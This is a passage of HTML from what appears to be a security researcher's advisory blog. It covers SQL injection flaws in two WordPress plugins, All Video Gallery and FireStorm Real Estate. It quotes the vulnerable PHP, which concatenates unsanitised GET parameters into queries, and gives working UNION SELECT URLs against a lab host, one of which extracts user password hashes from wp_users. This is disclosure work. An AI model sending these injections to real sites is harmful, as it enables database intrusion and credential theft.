class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'page'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">'&lt;/link&gt;'</span><span class="crayon-sy">.</span><span class="crayon-s">"\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">node</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;/item&gt;'</span><span class="crayon-sy">.</span><span class="crayon-s">"\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-51">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">node</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-53"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0180 seconds] -->
<p>Note however that the &#8220;vid&#8221; GET parameter is never sanitized, which means that we can inject SQL into it and disclose information from the database by making a simple request to either of the pages like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b8e15490691953" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/wp-content/plugins/all-video-gallery/xml/playlist.php?vid=2 UNION SELECT 1, 2, user(), @@version, 5, 6, 7, 8, 9, 10, database(), 12, 13, 14, 15, 16, 17, 18</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b8e15490691953-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b8e15490691953-1">http://192.168.80.130/wordpress/wp-content/plugins/all-video-gallery/xml/playlist.php?vid=2 UNION SELECT 1, 2, user(), @@version, 5, 6, 7, 8, 9, 10, database(), 12, 13, 14, 15, 16, 17, 18</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/all-video-gallery/" rel="tag">All video Gallery</a>, <a href="https://charlieeriksen.github.io/tag/sql-injection/" rel="tag">SQL Injection</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/11/04/wordpress-all-video-gallery-plugin-sql-injection/#respond" title="Comment on WordPress All Video Gallery Plugin SQL injection vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-180 -->

				
					
<article id="post-183" class="post-183 post type-post status-publish format-standard hentry category-advisories tag-firestorm-professional-real-estate-plugin tag-sql-injection tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/10/25/wordpress-firestorm-professional-real-estate-plugin-sql-injection-vulnerability/" title="1:03 pm" rel="bookmark" class="entry-date"><time datetime="2012-10-25T13:03:30+00:00" pubdate>October 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/10/25/wordpress-firestorm-professional-real-estate-plugin-sql-injection-vulnerability/" title="Permalink to WordPress FireStorm Professional Real Estate Plugin SQL Injection vulnerability" rel="bookmark">WordPress FireStorm Professional Real Estate Plugin SQL Injection vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50873/">Secunia Advisory SA 50873</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The FireStorm Professional Real Estate Plugin for WordPress offers functionality for an user to search for real estate based on a province or country. It is implemented in the file <a href="http://plugins.svn.wordpress.org/fs-real-estate-plugin/tags/2.03/search.php">search.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b9421564091960" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?php
require("../../../wp-config.php"); 

if(isset($_GET['ProvinceID'])){
	$FSREPCities = $wpdb-&gt;get_results("SELECT * FROM ".$wpdb-&gt;prefix."fsrep_cities WHERE province_id = ".$_GET['ProvinceID']." ORDER BY city_name");
	$FSREPProvince = $wpdb-&gt;get_row("SELECT * FROM ".$wpdb-&gt;prefix."fsrep_provinces WHERE province_id = ".$_GET['ProvinceID']);
	$HTTPREFERER = explode('?', $_SERVER['HTTP_REFERER']);
	if (substr($HTTPREFERER[0], -13) == '/add-listing/') {
		echo "obj.options[obj.options.length] = new Option('Select ".$FSREPconfig['CityLabel'].",'');\n";
	} else {
		echo "obj.options[obj.options.length] = new Option('Show All of ".$FSREPProvince-&gt;province_name."','');\n";
	}
	$count = 1;
	foreach ($FSREPCities as $FSREPCities) {
		echo "obj.options[obj.options.length] = new Option('".$FSREPCities-&gt;city_name."','".$FSREPCities-&gt;city_id."');\n";
		if ($FSREPCities-&gt;city_id == $_GET['cvalue']) {
			echo "obj.options[$count].selected = true;";
		}
		$count++;
	}
}
if(isset($_GET['CountryID'])){
	$FSREPProvinces = $wpdb-&gt;get_results("SELECT * FROM ".$wpdb-&gt;prefix."fsrep_provinces WHERE country_id = ".$_GET['CountryID']." ORDER BY province_name");
	$FSREPCountry = $wpdb-&gt;get_row("SELECT * FROM ".$wpdb-&gt;prefix."fsrep_countries WHERE country_id = ".$_GET['CountryID']);
	$count = 1;
	echo "obj.options[obj.options.length] = new Option('Select ".$FSREPconfig['ProvinceLabel']."','');\n";
	foreach ($FSREPProvinces as $FSREPProvinces) {
		echo "obj.options[obj.options.length] = new Option('".$FSREPProvinces-&gt;province_name."','".$FSREPProvinces-&gt;province_id."');\n";
		if ($FSREPProvinces-&gt;province_id == $_GET['cvalue']) {
			echo "obj.options[$count].selected = true;";
		}
		$count++;
	}
}

?&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-8">8</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-10">10</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-12">12</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-14">14</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-16">16</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-18">18</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-20">20</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-22">22</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-24">24</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-26">26</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-28">28</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-30">30</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-32">32</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-34">34</div><div class="crayon-num" data-line="crayon-53c98e78b9421564091960-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b9421564091960-36">36</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b9421564091960-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-2"><span class="crayon-k ">require</span><span class="crayon-sy">(</span><span class="crayon-s">"../../../wp-config.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-4"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'ProvinceID'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$FSREPCities</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"fsrep_cities WHERE province_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'ProvinceID'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">" ORDER BY city_name"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$FSREPProvince</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"fsrep_provinces WHERE province_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'ProvinceID'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$HTTPREFERER</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">'?'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$_SERVER</span><span class="crayon-sy">[</span><span class="crayon-s">'HTTP_REFERER'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-v">$HTTPREFERER</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">13</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'/add-listing/'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('Select "</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPconfig</span><span class="crayon-sy">[</span><span class="crayon-s">'CityLabel'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">",'');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('Show All of "</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPProvince</span><span class="crayon-o">-&gt;</span><span class="crayon-i">province_name</span><span class="crayon-sy">.</span><span class="crayon-s">"','');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$count</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$FSREPCities</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">$FSREPCities</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('"</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPCities</span><span class="crayon-o">-&gt;</span><span class="crayon-i">city_name</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPCities</span><span class="crayon-o">-&gt;</span><span class="crayon-i">city_id</span><span class="crayon-sy">.</span><span class="crayon-s">"');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$FSREPCities</span><span class="crayon-o">-&gt;</span><span class="crayon-i">city_id</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'cvalue'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[$count].selected = true;"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$count</span><span class="crayon-o">++</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-21"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-22"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'CountryID'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"fsrep_provinces WHERE country_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'CountryID'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">" ORDER BY province_name"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$FSREPCountry</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"fsrep_countries WHERE country_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'CountryID'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$count</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('Select "</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPconfig</span><span class="crayon-sy">[</span><span class="crayon-s">'ProvinceLabel'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">"','');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('"</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-o">-&gt;</span><span class="crayon-i">province_name</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-o">-&gt;</span><span class="crayon-i">province_id</span><span class="crayon-sy">.</span><span class="crayon-s">"');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-o">-&gt;</span><span class="crayon-i">province_id</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'cvalue'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[$count].selected = true;"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$count</span><span class="crayon-o">++</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-34"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b9421564091960-35">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b9421564091960-36"><span class="crayon-ta">?&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0149 seconds] -->
<p>By either providing a ProvinceID or CountryID, we can make the application pass the value into two SQL queries. Note however that in both cases, the value is taken directly from the GET parameter without sanitazion, which opens it up to a SQL injection attack where we can select arbitrary data from the database. For instance, we can select the password hash for an user like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b9435529608238" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/wp-content/plugins/fs-real-estate-plugin/search.php?ProvinceID=35335%20UNION%20SELECT%201,%20user_pass,%203,%204,%205,%206,%207,%208%20from%20wp_users</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
